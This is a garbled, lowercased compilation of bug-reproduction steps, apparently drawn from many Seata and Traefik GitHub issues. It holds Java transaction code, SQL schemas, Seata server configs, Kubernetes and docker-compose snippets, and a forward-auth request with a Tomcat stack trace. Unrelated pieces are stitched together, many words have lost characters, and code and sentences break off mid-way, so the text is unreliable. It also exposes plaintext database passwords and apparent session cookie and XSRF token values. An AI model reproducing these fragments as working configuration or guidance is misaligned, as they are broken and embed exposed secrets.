@globaltransactional public returnmessage addlist(list<memberinfo> memberinfolist) { logger.error("xid"+ rootcontext.getxid()); transactiontypeholder.set(transactiontype.base); int result =memberinfomapper.addlist(memberinfolist); list<long> ids=new arraylist<>(); for (memberinfo info : memberinfolist) { ids.add(info.getid()); } // returnmessage pointresult= memberpointi.addmemberpoint(memberinfolist); logger.info(json.tojsonstring(pointresult)); // int z=1/0; return result>0?new returnmessage(returncode.success," ort:"+port,ids):new returnmessage(returncode.success," :port"+port,null); }
4 sql erchantid
create table `t_member` ( `id` bigint(20) not null auto_increment, `merchantid` bigint(20) default '0' comment ' d', `member_name` varchar(255) default null comment ' ', `create_time` timestamp not null default current_timestamp on update current_timestamp comment ' ', primary key (`id`)
) engine=innodb auto_increment=1086 default charset=utf8; create table `t_member0` ( `id` bigint(20) not null auto_increment, `merchantid` bigint(20) default '0' comment ' d', `member_name` varchar(255) default null comment ' ', `create_time` timestamp not null default current_timestamp on update current_timestamp comment ' ', primary key (`id`)
) engine=innodb auto_increment=1086 default charset=utf8; create table `t_member1` ( `id` bigint(20) not null auto_increment, `merchantid` bigint(20) default '0' comment ' d', `member_name` varchar(255) default null comment ' ', `create_time` timestamp not null default current_timestamp on update current_timestamp comment ' ', primary key (`id`)
) engine=innodb auto_increment=1086 default charset=utf8;
5 ttp
[ { "merchantid":214, "membername":" ", "createtime":"2020-05-18 15:02:01" }, { "merchantid":214, "membername":" ", "createtime":"2020-06-18 15:02:01" }, { "merchantid":214, "membername":" ", "createtime":"2020-05-18 15:02:01" } ]
spring: application: name: shardingjdbc-inline shardingsphere: datasource: names: ds0 ds0: type: com.zaxxer.hikari.hikaridatasource driver-class-name: com.mysql.jdbc.driver jdbc-url: jdbc:mysql://192.168.1.188:3306/pdy_member username: root password: mysql props: sql: show: true sharding: tables: t_member: key-generator: column: id type: snowflake actual-data-nodes: ds0.t_member$->{0..2} table-strategy: # inline: # sharding-column: merchantid algorithm-expression: t_member$->{merchantid % 3}
resultset tablers = dbmd.gettables(null, schema, null, new string[]{"table"}); ull, %
cc rapifnecessary
tcc
reproduce step
`server.max.commit.retry.timeout=1` `-1` 2
`2027747546`
![image](
lobal lock .
![image](
registryredisproperties db
ml - jdk version :1.8
- os :windows
this is some example
select x from test;
select x from 'test';
select x from test;
set transaction.undo.log.serialization as protostuff
before commit or rollback, halt the process, delete a undo log manually.
resume the process, which would throw an exception indicating it is failed to insert a undo log.
named table name as 'order'
then invoker it with seata datasource proxy
get tablemata failed
use hibernate batch insert
seata-server.sh -p 8091 -m db -dseataenv=test
would you mind merge my seata sample pr [sample#235]( then you could run my test case
run sample project(springboot-dubbo-seata) follow the readme guide
take a break point in business service's last line
quey account global lock test: `curl -h "content-type:application/json" -x get localhost:8102/account/test_global_lock`
you will find a exception in tc and account service, that is bug1
after you resolve bug 1 do step 4 again, you will find bug3
then you need to remove @transactional of `io.seata.samples.integration.account.service.taccountserviceimpl#testgloballock` and do step 4 again, you will find bug2
execute seata-sample project with oracle database.
use oracle database
change the transaction.undo.log.delete.period in server for easy test
create two global transactionals without resource competition.
call them in one method.
second instance of the same app id online
any byte array field may trigger the issue.
start an activiti process instance.
seata-samples-dubbo
at @globaltransactional method idea debug
```java @globaltransactional public void purchase(string userid, string commoditycode, int ordercount) { storagetccaction.prepare(null,commoditycode,ordercount); string ordercode = commoditycode + threadlocalrandom.current().nextint(1000,9999); orderdto orderdto = orderdto.builder().userid(userid).commoditycode(ordercode).count(ordercount).build(); createordertccaction.prepare(null,orderdto,userid,ordercode); if (!validdata()) { throw new runtimeexception("rollback"); } }
public interface createordertccaction { @twophasebusinessaction(name = "createordertccaction" , commitmethod = "commit", rollbackmethod = "rollback") boolean prepare(businessactioncontext actioncontext, orderdto order, @businessactioncontextparameter(paramname = "userid") string userid, @businessactioncontextparameter(paramname = "commoditycode") string commoditycode); boolean commit(businessactioncontext actioncontext); boolean rollback(businessactioncontext actioncontext); } ```
just need delete a record under global transaction, throw an exception and make it roll back
seatahandlerinterceptorconfiguration ebmvcconfigurer ebmvcconfigurer ddformatters eatahandlerinterceptorconfiguration ddformatters
can not started when integrate with nacos
```java @globallock() public long publisharticle(publisharticledto publisharticledto){ preconditions.checknotnull(publisharticledto, " "); preconditions.checkargument(!strings.isnullorempty(publisharticledto.gettitle()), " "); preconditions.checknotnull(publisharticledto.getuserid(), " d "); preconditions.checkargument(!strings.isnullorempty(publisharticledto.getcontent()), " "); article article = new article(); beanmapper.map(publisharticledto, article); article.setarticletype(articletype.upload.name()); article.setstatus(resourcestatus.enable.name()); article.setarticleurl(""); save(article); string content = publisharticledto.getcontent(); long articleid = article.getid(); bytearrayinputstream contentstream = new bytearrayinputstream(content.getbytes()); string url = uploadservice.uploadarticle(string.valueof(articleid),contentstream); article.setarticleurl(url); saveorupdate(article); return articleid; }
as example as
the simple way to reproduce code is : ```java
public class fastjsonusage { public static void main(string[] args) { list<field> fields = new arraylist<>(); fields.add(field.builder().name("integer").type(3).value(1).build()); fields.add(field.builder().name("bigdecimal").type(3).value(bigdecimal.one).build()); system.out.println("before"); fields.foreach(f -> system.out.println(f.getname() + ":" + f.getvalue().getclass().getname())); string serializedstring = json.tojsonstring(fields, serializerfeature.writedateusedateformat); list<field> deserializelist = json.parsearray(serializedstring, field.class); system.out.println("after"); deserializelist.foreach(f -> system.out.println(f.getname() + ":" + f.getvalue().getclass().getname())); } @builder @allargsconstructor @noargsconstructor @getter @setter static class field { private string name; private integer type; private object value; }
} ``` and the result is ```
integer:java.lang.integer
bigdecimal:java.math.bigdecimal
integer:java.lang.integer
bigdecimal:java.lang.integer
``` you can reproduce with my project also, which under module [cloud-seata-nacos](
1.clone the latest code from
2.add the following code in the create method of orderserviceimpl:
`jdbctemplate.execute("select * from order_tbl where id=\'2\' for update");`
3.then run the workshop,you will able to see the exceptions.
seata-server -> file.config
transport { # tcp udt unix-domain-socket type = "tcp" #nio native server = "nio" #enable heartbeat heartbeat = true #thread factory for netty thread-factory { boss-thread-prefix = "nettyboss" worker-thread-prefix = "nettyservernioworker" server-executor-thread-prefix = "nettyserverbizhandler" share-boss-worker = false client-selector-thread-prefix = "nettyclientselector" client-selector-thread-size = 1 client-worker-thread-prefix = "nettyclientworkerthread" # netty boss thread size,will not be used for udt boss-thread-size = 1 #auto default pin or 8 worker-thread-size = 8 }
service { #vgroup->rgroup vgroup_mapping.my_test_tx_group = "default" #only support single node default.grouplist = "127.0.0.1:8091" #degrade current not support enabledegrade = false #disable disable = false #unit ms,s,m,h,d represents milliseconds, seconds, minutes, hours, days, default permanent max.commit.retry.timeout = "-1" max.rollback.retry.timeout = "-1"
} client { async.commit.buffer.limit = 10000 lock { retry.internal = 10 retry.times = 30 } report.retry.count = 5
} ## transaction log store
store { ## store mode: file b mode = "db" ## file store file { dir = "sessionstore" # branch session size , if exceeded first try compress lockkey, still exceeded throws exceptions max-branch-session-size = 16384 # globe session size , if exceeded throws exceptions max-global-session-size = 512 # file buffer size , if exceeded allocate new buffer file-write-buffer-cache-size = 16384 # when recover batch read size session.reload.read_size = 100 # async, sync flush-disk-mode = async } ## database store db { ## the implement of javax.sql.datasource, such as druiddatasource(druid)/basicdatasource(dbcp) etc
datasource = "dbcp" ## mysql/oracle/h2/oceanbase etc
db-type = "mysql" url = "jdbc:mysql://localhost:3306/db_seata?useunicode=true&characterencoding=utf-8&usessl=false" user = "root" password = "123456" min-conn = 1 max-conn = 3 global.table = "global_table" branch.table = "branch_table" query-limit = 100 }
lock { ## the data row lock store mode: local_db emory or db mode = "db" memory{ ## store lock in memory of server } db{ ## use db of server to store lock, the db is ${store.db.url} lock-table= "lock_table" } local_db { ## store lock in local db }
recovery{ committing-retry-delay = 30 asyn-committing-retry-delay = 30 rollbacking-retry-delay = 30 timeout-retry-delay = 30
} transaction { undo.data.validation = false undo.log.serialization = fastjson
seata-server -> registry.config
registry { # file acos ureka edis k onsul tcd3 ofa type = "nacos" nacos { serveraddr = "localhost" namespace = "public" cluster = "default" } eureka { serviceurl = " " application = "default" weight = "1" } redis { serveraddr = "localhost:6379" db = "0" } zk { cluster = "default" serveraddr = "127.0.0.1:2181" session.timeout = 6000 connect.timeout = 2000 } consul { cluster = "default" serveraddr = "127.0.0.1:8500" } etcd3 { cluster = "default" serveraddr = " " } sofa { serveraddr = "127.0.0.1:9603" application = "default" region = "default_zone" datacenter = "defaultdatacenter" cluster = "default" group = "seata_group" addresswaittime = "3000" } file { name = "file.conf" }
} config { # file acos pollo k onsul tcd3 type = "nacos" nacos { serveraddr = "localhost" namespace = "public" cluster = "default" } consul { serveraddr = "127.0.0.1:8500" } apollo { app.id = "seata-server" apollo.meta = " " } zk { serveraddr = "127.0.0.1:2181" session.timeout = 6000 connect.timeout = 2000 } etcd3 { serveraddr = " " } file { name = "file.conf" }
nacos initialized nacos-config.sh
use default xid pattern contains ip address
execute a global transaction successfully
see the log of deleting undo log asynchronous
deploy snapshot jar
create a bean that mark by @lazy annotation, throw a exception when instantiating it before lazy instantiation.
trigger globaltransactionscanner
can not instantiate it.
able to resolve exceptions
seata server 0.5.0 start : nohup sh seata-server.sh 8091 > fescar-console.log 2>&1 &
test business purchase method (it will be invoke 3 dubbo rpc method :account ,order and storage)
business->tm apply the global transaction id:xid, and 3 rm register resourceids ; server root.data add info for this transaction
3 rm tell the seata server the phaseone done ,db data has update ,undo_log has 3 rollback sql;
the purchase method will be sleep some seconds with killing the seata server process
3 rm will log it can't be to connect the sever
restart seata server
3 rm log that they register success in seata server;
then nothing happened
debug sure that is relative with sqlunionquery class.
bug will happend when i use like:
update table1 set name='' where id in (1,2)
get fescar demo code,and modify businessserviceimpl.java#purchase method like: @override @globaltransactional(timeoutmills = 5000, name = "dubbo-demo-tx") public void purchase(string userid, string commoditycode, int ordercount) { logger.info("purchase begin ..
xid: " + rootcontext.getxid()); storageservice.deduct(commoditycode, ordercount); try { logger.info("sleep for a while"); thread.sleep(10000); } catch (interruptedexception e) { e.printstacktrace(); } orderservice.create(userid, commoditycode, ordercount); } 2 just run the demo
debug sure that is relative with sqlunionquery class.
bug will happend when i use like:
select * from table1 union all select * from table2
when i change the sql to
select t.* from (select * from table1 union all select * from table2) t
the demo will reproduce it
just downloads the newest source code 2
get the dependencies ready
open the server module, run the servertest.java in test directory , then you will see the exception
i find there are two way to instantiate the class datasourcemanager
defaultresourcemanager uses enhancedserviceloader to instantiate datasourcemanager enhancedserviceloader call datasourcemanager() and datasourcemanager.init()
then register datasourceproxy to this datasourcemanager
datasourcemanager's member asyncworker call datasourcemanager.get() to instantiate another datasourcemanager
abstractrmhandler uses the first datasourcemanager instantiation to do branchcommit
the first datasourcemanager pass branchcommit to its asyncworker
while asyncworker uses the second datasourcemanager instantiation to get datasourceproxy ,which no datasourceproxy is registered
asyncworker.dobranchcommit throw npe at line158.
prepare data before test ![image]( 1
two programs directly execute `update storage_tbl set count = count - ? where commodity_code = ?` ![image]( ![image]( 2
make storageserviceimpl stop at ![image]( 3
run storageserviceimpl1,after retrying two times, stop at ![image]( 4
resume the break point in storageserviceimpl and wait until global transaction is committed successfully
resume the break point in storageserviceimpl1 6
you can found ![image]( because storageserviceimpl1 repeatedly execute biz sql two times, so the value is 96 instead of 98
this is wrong.
i have a project [fescar-test]( you need to edit [simple.java]( first to bypass ![image](
you can run simple.java in my project if you would like to.
[
on windows run the bin/fescar-server.bat
before entering com.alibaba.fescar.server.coordinator.defaultcoordinator#handleretryrollbacking, turn all the rm down.
debug point on
com.alibaba.fescar.rm.datasource.connectionproxy#
if (context.hasundolog())//line 2
until the server notifies the branch to roll back when it finds that the global transaction has timed out
branch rollback(has no undo_log) return succ
finally release debug point
deploy traefik 1.7.24 and create an ingress for kube-apiserver ```yaml apiversion: extensions/v1beta1 kind: ingress metadata: annotations: ingress.kubernetes.io/protocol: https kubernetes.io/ingress.class: traefik traefik.ingress.kubernetes.io/rule-type: pathprefixstrip name: kubernetes namespace: default spec: rules: - http: paths: - backend: servicename: kubernetes serviceport: https path: / ``` 1
configure my local kubeconfig `kubectl` to use the ingress 1
create a kubernetes deployment and monitor its status ```shell kubectl create deployment nginx --image=nginx && kubectl rollout status deploy nginx ``` both commands terminate: ```shell deployment.apps/nginx created waiting for deployment "nginx" rollout to finish: 0 of 1 updated replicas are available..
deployment "nginx" successfully rolled out ``` 1
now, monitor the deployment status again ```shell kubectl rollout status deploy nginx ``` the command writes ```shell deployment "nginx" successfully rolled out ``` but the command does not terminate until either: (a) the connection is closed (e.g
if the request goes through a load balancer, and it closes the connection when the idle timeout is reached), or (b) the deployment resource is updated, or deleted
if i configure `kubectl` to talk directly to `kube-apiserver`, i.e., not via the ingress, then this same command *does* terminate, almost immediately
my theory for the different behavior is that the `rollout status` command creates a watch, which kube-apiserver creates using the spdy protocol
support for this was added in #6553 (included in release [v1.7.23]( and works by using http/1.1
but the original request is a get request, for which the http/1.1 pipelining implementation (#3513) does not implement the `closenotify()` method, as is the recommendation, per the [net/http]( library
for reference, that recommendation merged in [this commit]( which has more context in its commit message
the theory is mostly based on the debug message that traefik logs just after receiving the request.
i introduced deliberately an error in the dynamic config load sequence (404 response to the http provider)
i have traefik ingress controller running on my gke cluster
installed with helm chart:
`helm install traefik traefik/traefik --version 9.3.0 -f traefik-values.yaml` traefik-values.yaml:
ports: traefik: expose: true # websecure: # exposedport: 8443 service: spec: loadbalancerip: xxx.xxx.xxx.xxx additionalarguments: - "--certificatesresolvers.letsencrypt.acme.tlschallenge" - "--entrypoints.websecure.http.tls.certresolver=letsencrypt" - "--certificatesresolvers.letsencrypt.acme.email=jenkins@xxx.com" - "--certificatesresolvers.letsencrypt.acme.storage=/data/acme.json" - "--certificatesresolvers.letsencrypt.acme.caserver= " - "--api.insecure=true" - "--accesslog=true" - "--log.level=debug"
``` my grpc service ingress:
apiversion: traefik.containo.us/v1alpha1
kind: ingressroute
metadata: creationtimestamp: "2020-10-19t12:42:47z" generation: 1 labels: app: ir-elliq-bdi-server release: ir-my-server-2.0.0-3333 version: 2.0.0-3333 name: ir-my-server-2-0-0-3333 namespace: dev2 resourceversion: "62089804" selflink: /apis/traefik.containo.us/v1alpha1/namespaces/dev2/ingressroutes/ir-my-server-2-0-0-3333 uid: 30c71527-46f4-4c5a-837c-b4152dde67c4
spec: routes: - kind: rule match: host("xxx.yyy.co") && headers("server-version","2.0.0-3333") services: - kind: service name: ir-my-server-2-0-0-3333 port: 8443 schema: h2c spec: entrypoints: - websecure tls: certresolver: letsencrypt
here are the labels i used in the docker-compose.yml for the service:
labels: - "traefik.enable=true" - "traefik.docker.network=nginx-proxy" - "traefik.http.routers.portus-registry.rule=host(`${registry_machine_fqdn}`)" - "traefik.http.routers.portus-registry.entrypoints=https" - "traefik.http.routers.portus-registry.tls=true" - "traefik.http.routers.portus-registry.tls.certresolver=mycertresolover" ```
i used docker provider to build a proxy for a service
there is a dash sign in the domain name, eg: foo-bar.example.com.
my cert resolver is configured to use dnschallenge via cloudflare api to validate the domain name.
compose file with traefik 1.7.26 on windows works with docker-compose but not with docker swarm
october patches are applied so exposed ports in swarm are reachable (again)
we have the following setup running: - there is a containerized traefik 2 instance as our main loadbalancer, configured mainly via consul-catalog - we have 4 minio servers registered as a router + service in consul
traefik has picked these up as a service to loadbalance
for simplicity, lets say the rule matches the host s3.example.com
- the minio nodes run nginx + minio in the recommended minio setup
lets assume one of them is reachable as minio01.example.com - a java process running the aws s3 sdk accesses minio via s3.example.com, specifically using putobject requests
run `traefik.exe` via `cmd.exe` console and press `ctrl+c`.
deployed traefik 2.3 via the official docker image
configured the location of acme.json in an docker overlay2 volume
this issue can happen in two ways, but basically just modify `acme.json` in any way, have an already existing `acme.json`, incorrect permissions for `acme.json`
pretty much anything that traefik may not expect with the `acme.json` file.
starting traefik on openbsd (see configurations below)
trying to access the published services (webservers) through traefik ip
- running traefik as deployment (ingress controller) in k8s
- having bunch of services running where traefik serves as ingress controller
* created a tlsoptions resource
* created a certificate which is valid for two domains host1.example.com & host2.example.com
* created a ingressroute which contains three rules for the two domains
* i reused a http2 connection established on host2.example.com for host1.example.com
we have migrated all the deployments of a kubernetes cluster from helm v2.x to v3.x (traefik itself is **not** deployed with helm)
helm v2 used to store helm "releases" using **configmaps**
in helm v3 the "releases" are stored using **secrets**
the contents of theses new secrets (we had around 700 of them) are quite large binaries (at least hundreds of kib, but lesser than 1mib which is kubernetes/etcd limitation) and it seems that traefik downloads them all from kubernetes and keeps them in memory (or at least it does not have time to discard them before it is killed)
fyi before we made the migration the memory limit for traefik pods was 512mi and we never had a problem
we had to increase it to 2gi to make it work until we understood where the memory consumption was coming from
for the record helm v2 made the `nginx-ingress-controller` behave quite similarly (oomkilled because it reached the limit) because it was downloading all the clusters configmaps including all the ones storing helm v2 releases
the following patch was merged to avoid downloading helm related configmaps any longer
note that this would not work as it for traefik and helm v3 secrets as it seems that helm v3 secret labeling use `owner=helm` instead of `owner=tiller`, i don't know if the filtering is case sensitive.
updated an existing ingress and created a brand new ingress to test both cases
i'm using docker containers to run synapse, a homeserver for the matrix protocol
one container runs the primary process while some others run so-called workers
everything was working fine until i updated to traefik 2.3 (curiously a downgrade does not fix my issue, though!)
since then, while the primary container is recognised just fine by traefik via the labels in my compose file, the workers aren't recognised anymore at all
they don't appear in the dashboard nor can they be routed to
the containers themselves are running just fine and are functional, though
i'm completely unable to see what might be wrong and i've been experimenting for days now
since asking for advice in your community ( didn't yield any results and there was one person on reddit who had the same issue ( i assume they and i are hitting some obscure bug
here's the docker-compose yaml configuration for the main process which does get picked up by traefik: ~krueger/traefik/main_process-working.yaml here's the worker configuration that does not get picked up by traefik: ~krueger/traefik/worker_unseen_by_traefik.yaml should you need any additional information, please just let me know.
i used to have traefik ui 2.2.0 it worked fine on all browser.
i update the traefik from 2.2.0 to 2.3.0, to do that i change the image tag and update the clusterrole.
this is a replication and investigation report for the issue reported in and discussed on the community forums - prior to traefik v2.1, `ingressroute` was not capable of routing to services outside of its own "root" namespace
- this limitation appears to coincide with the constraints on k8s native `ingress` based on an [issue reported]( #issuecomment-547323939) running traefik 2.0.4
- this limitation was removed with the introduction of [this pr]( and shipped with traefik v2.1 to current.
- while a user can [define which namespaces can be watched]( #namespaces), this does not constrain the user's ability to restrict `ingressroute` to their respective namespaces, which is based on an expectation set by native k8s `ingress` objects and the behavior of `ingressroute` prior to 2.1.
- this behavior is specific to traefik and `ingressroute` and i could reproduce the regressed behavior on v2.0, and produce the cross-namespace behavior on 2.3 on k8s 1.16, 1.17, and 1.18 (this is not something k8s will restrict)
updated to traefik v2.3.0 and try to use the newly added serverstransport config as mentioned in the changelog as: `[service,tls] add serverstransport on services (#7203 by juliens)`
added the following to a service's labels in docker-compose:
``` - "traefik.http.serverstransports.server.servername=server" - "traefik.http.serverstransports.server.rootcas=/certs/rootca.pem"
``` additionally, looked for the commit in question on the v2.3.0 branch
the config exampl say after enable consul catalog then i shoud tag service with below tag ```
- traefik.http.services.my-service.rule=host(`example.com`)
``` ![image]( but it does not work until i changed to ```
- traefik.http.routers.my-service.rule=host(`example.com`)
``` and i double checked
it does not have labels like `traefik.http.services.my-service.rule` but only `traefik.http.routers.my-service.rule` then i realized this may be a document issue
please confirm if i am right since i waste hours find the reason.
i recently received a let's encrypt expiry notice
after further investigation it appears v2.2.10 (#7238) changed how `delaybeforecheck` works
my internal network uses split-horizon dns and requires all outbound dns pass through the local resolver
i previously used `delaybeforecheck` to skip the local validation and introduce a delay
this no longer works
create an external service [as described here]( using either scenario 1 or 2 (i did not test scenario 3).
verify that the service is displayed in the traefik dashboard.
attempt to reach the service.
i'm writing a [middleware plugin]( for http2 pushing, [checking]( #l68) if the response writer supports pushing through the `http.pusher` interface always returns false, even when the downstream service communicates using http2.
i tried using a middleware chain with "error-pages" before "basicauth"
even though it\'s nothing critical, and can be worked around, this caused the "bug" i described below.
i\'m developing a plugin for pushing http2 files, and i\'m testing it using the "devplugin" section in the static config
after making some changes and starting traefik to see if they work, i was met with a `runtime error: invalid memory address or nil pointer dereference` coming from traefik itself when loading the plugin, not my code
the code of the plugin can be found [here](
i set up an ipwhitelist middleware for our application and tried to access one of the routers with the middleware attached.
update from 2.2.8 to 2.2.10
nothing, just found my traefik in this condition today after two fine weeks, but joining to the pilot group works well
i've configured [forward auth]( #l67) in traefik
```yml forwardauth: address: " " authresponseheaders: - "x-auth-username" - "x-auth-userid" - "x-auth-expiresin" - "x-auth-role"
``` when i try to upload file a frontend [sents request]( #l44) like below to the backend
curl \' -h \'user-agent: mozilla/5.0 (x11; fedora; linux x86_64; rv:79.0) gecko/20100101 firefox/79.0\' -h \'accept: application/json, text/plain, */*\' -h \'accept-language: ru-ru,ru;q=0.8,en-us;q=0.5,en;q=0.3\' --compressed -h \'x-xsrf-token: 443c72d5-234f-40fd-ba8e-6eb567590e04\' -h \'content-type: multipart/form-data; boundary=---------------------------31244158103659301652102077701\' -h \'origin: -h \'dnt: 1\' -h \'connection: keep-alive\' -h \'referer: -h \'cookie: idea-71d2226b=ce2304b6-1f64-4e8b-8de5-3c03f71cddeb; idea-1b0501e6=9a111b55-469c-456d-a539-2ab32fc85402; session=mzq4zwezytqtmzbjzi00ntu1lwflzjatymmznwi5oti0njnk; xsrf-token=443c72d5-234f-40fd-ba8e-6eb567590e04\' -h \'pragma: no-cache\' -h \'cache-control: no-cache\' --data-binary $\'-----------------------------31244158103659301652102077701\ \ content-disposition: form-data; name="data"; filename="71fnx7xilml._sl1500_.jpg"\ \ content-type: image/jpeg\ \ \ \ -----------------------------31244158103659301652102077701--\ \ \'
``` it becomes get with content-type: multipart/form-data; because of [setting headers from original request to forwarded]( #l92), ..
and goes to the authentication microservice
authentication microservice logs
2020-08-29 04:08:29.501 [17 ms]
get /internal/profile http/1.1
host: api.site.local:8060
user-agent: mozilla/5.0 (x11; fedora; linux x86_64; rv:79.0) gecko/20100101 firefox/79.0
accept: application/json, text/plain, */*
accept-encoding: gzip, deflate
accept-language: ru-ru,ru;q=0.8,en-us;q=0.5,en;q=0.3
cache-control: no-cache
content-type: multipart/form-data; boundary=---------------------------354625936717211410991541674829
cookie: idea-71d2226b=ce2304b6-1f64-4e8b-8de5-3c03f71cddeb; idea-1b0501e6=9a111b55-469c-456d-a539-2ab32fc85402; m=2258:z3vlc3q6z3vlc3q%253d; session=mzq4zwezytqtmzbjzi00ntu1lwflzjatymmznwi5oti0njnk; xsrf-token=443c72d5-234f-40fd-ba8e-6eb567590e04
origin:
pragma: no-cache
referer:
uber-trace-id: 33e9abbf356bb7c112cf38a56d53b92f:428da8cc00c3573e:12cf38a56d53b92f:1
x-forwarded-for: 172.28.0.1
x-forwarded-host: localhost:8081
x-forwarded-method: post
x-forwarded-port: 8081
x-forwarded-proto: http
x-forwarded-server: traefik
x-forwarded-uri: /api/storage/avatar
x-real-ip: 172.28.0.1
x-xsrf-token: 443c72d5-234f-40fd-ba8e-6eb567590e04
``` typical servlet container (tomcat) cannot handle correctly get request with `content-type: multipart/form-data;`, boundaries but **without body**, it tries to parse request parts and throws exception:
org.springframework.web.multipart.multipartexception: failed to parse multipart servlet request; nested exception is java.io.ioexception: org.apache.tomcat.util.http.fileupload.fileuploadexception: stream closed at org.springframework.web.multipart.support.standardmultiparthttpservletrequest.handleparsefailure(standardmultiparthttpservletrequest.java:124) at org.springframework.web.multipart.support.standardmultiparthttpservletrequest.parserequest(standardmultiparthttpservletrequest.java:115) at org.springframework.web.multipart.support.standardmultiparthttpservletrequest.<init>(standardmultiparthttpservletrequest.java:88) at org.springframework.web.multipart.support.standardservletmultipartresolver.resolvemultipart(standardservletmultipartresolver.java:87) at org.springframework.web.servlet.dispatcherservlet.checkmultipart(dispatcherservlet.java:1178) at org.springframework.web.servlet.dispatcherservlet.dodispatch(dispatcherservlet.java:1012) at org.springframework.web.servlet.dispatcherservlet.doservice(dispatcherservlet.java:943) at org.springframework.web.servlet.frameworkservlet.processrequest(frameworkservlet.java:1006) at org.springframework.web.servlet.frameworkservlet.doget(frameworkservlet.java:898) at javax.servlet.http.httpservlet.service(httpservlet.java:626) at org.springframework.web.servlet.frameworkservlet.service(frameworkservlet.java:883) at javax.servlet.http.httpservlet.service(httpservlet.java:733) at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:231) at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) at org.apache.tomcat.websocket.server.wsfilter.dofilter(wsfilter.java:53) at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) at org.springframework.security.web.filterchainproxy$virtualfilterchain.dofilter(filterchainproxy.java:320) at org.springframework.security.web.access.intercept.filtersecurityinterceptor.invoke(filtersecurityinterceptor.java:126) at org.springframework.security.web.access.intercept.filtersecurityinterceptor.dofilter(filtersecurityinterceptor.java:90) at org.springframework.security.web.filterchainproxy$virtualfilterchain.dofilter(filterchainproxy.java:334) at org.springframework.security.web.access.exceptiontranslationfilter.dofilter(exceptiontranslationfilter.java:118) at org.springframework.security.web.filterchainproxy$virtualfilterchain.dofilter(filterchainproxy.java:334) at org.springframework.security.web.session.sessionmanagementfilter.dofilter(sessionmanagementfilter.java:137) at org.springframework.security.web.filterchainproxy$virtualfilterchain.dofilter(filterchainproxy.java:334) at org.springframework.security.web.authentication.anonymousauthenticationfilter.dofilter(anonymousauthenticationfilter.java:111) at org.springframework.security.web.filterchainproxy$virtualfilterchain.dofilter(filterchainproxy.java:334) at org.springframework.security.web.servletapi.securitycontextholderawarerequestfilter.dofilter(securitycontextholderawarerequestfilter.java:158) at org.springframework.security.web.filterchainproxy$virtualfilterchain.dofilter(filterchainproxy.java:334) at org.springframework.security.web.savedrequest.requestcacheawarefilter.dofilter(requestcacheawarefilter.java:63) at org.springframework.security.web.filterchainproxy$virtualfilterchain.dofilter(filterchainproxy.java:334) at org.springframework.security.web.authentication.abstractauthenticationprocessingfilter.dofilter(abstractauthenticationprocessingfilter.java:200) at org.springframework.security.web.filterchainproxy$virtualfilterchain.dofilter(filterchainproxy.java:334) at org.springframework.security.web.authentication.abstractauthenticationprocessingfilter.dofilter(abstractauthenticationprocessingfilter.java:200) at org.springframework.security.web.filterchainproxy$virtualfilterchain.dofilter(filterchainproxy.java:334) at org.springframework.security.oauth2.client.web.oauth2authorizationrequestredirectfilter.dofilterinternal(oauth2authorizationrequestredirectfilter.java:160) at org.springframework.web.filter.onceperrequestfilter.dofilter(onceperrequestfilter.java:119) at org.springframework.security.web.filterchainproxy$virtualfilterchain.dofilter(filterchainproxy.java:334) at org.springframework.security.web.authentication.logout.logoutfilter.dofilter(logoutfilter.java:116) at org.springframework.security.web.filterchainproxy$virtualfilterchain.dofilter(filterchainproxy.java:334) at org.springframework.security.web.csrf.csrffilter.dofilterinternal(csrffilter.java:117) at org.springframework.web.filter.onceperrequestfilter.dofilter(onceperrequestfilter.java:119) at org.springframework.security.web.filterchainproxy$virtualfilterchain.dofilter(filterchainproxy.java:334) at org.springframework.security.web.header.headerwriterfilter.doheadersafter(headerwriterfilter.java:92) at org.springframework.security.web.header.headerwriterfilter.dofilterinternal(headerwriterfilter.java:77) at org.springframework.web.filter.onceperrequestfilter.dofilter(onceperrequestfilter.java:119) at org.springframework.security.web.filterchainproxy$virtualfilterchain.dofilter(filterchainproxy.java:334) at org.springframework.security.web.context.securitycontextpersistencefilter.dofilter(securitycontextpersistencefilter.java:105) at org.springframework.security.web.filterchainproxy$virtualfilterchain.dofilter(filterchainproxy.java:334) at org.springframework.security.web.context.request.async.webasyncmanagerintegrationfilter.dofilterinternal(webasyncmanagerintegrationfilter.java:56) at org.springframework.web.filter.onceperrequestfilter.dofilter(onceperrequestfilter.java:119) at org.springframework.security.web.filterchainproxy$virtualfilterchain.dofilter(filterchainproxy.java:334) at org.springframework.security.web.filterchainproxy.dofilterinternal(filterchainproxy.java:215) at org.springframework.security.web.filterchainproxy.dofilter(filterchainproxy.java:178) at org.springframework.web.filter.delegatingfilterproxy.invokedelegate(delegatingfilterproxy.java:358) at org.springframework.web.filter.delegatingfilterproxy.dofilter(delegatingfilterproxy.java:271) at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) at org.springframework.web.filter.requestcontextfilter.dofilterinternal(requestcontextfilter.java:100) at org.springframework.web.filter.onceperrequestfilter.dofilter(onceperrequestfilter.java:119) at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) at org.springframework.web.filter.formcontentfilter.dofilterinternal(formcontentfilter.java:93) at org.springframework.web.filter.onceperrequestfilter.dofilter(onceperrequestfilter.java:119) at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) at org.springframework.session.web.http.sessionrepositoryfilter.dofilterinternal(sessionrepositoryfilter.java:141) at org.springframework.session.web.http.onceperrequestfilter.dofilter(onceperrequestfilter.java:82) at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) at org.springframework.boot.actuate.metrics.web.servlet.webmvcmetricsfilter.dofilterinternal(webmvcmetricsfilter.java:93) at org.springframework.web.filter.onceperrequestfilter.dofilter(onceperrequestfilter.java:119) at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) at org.springframework.web.filter.characterencodingfilter.dofilterinternal(characterencodingfilter.java:201) at 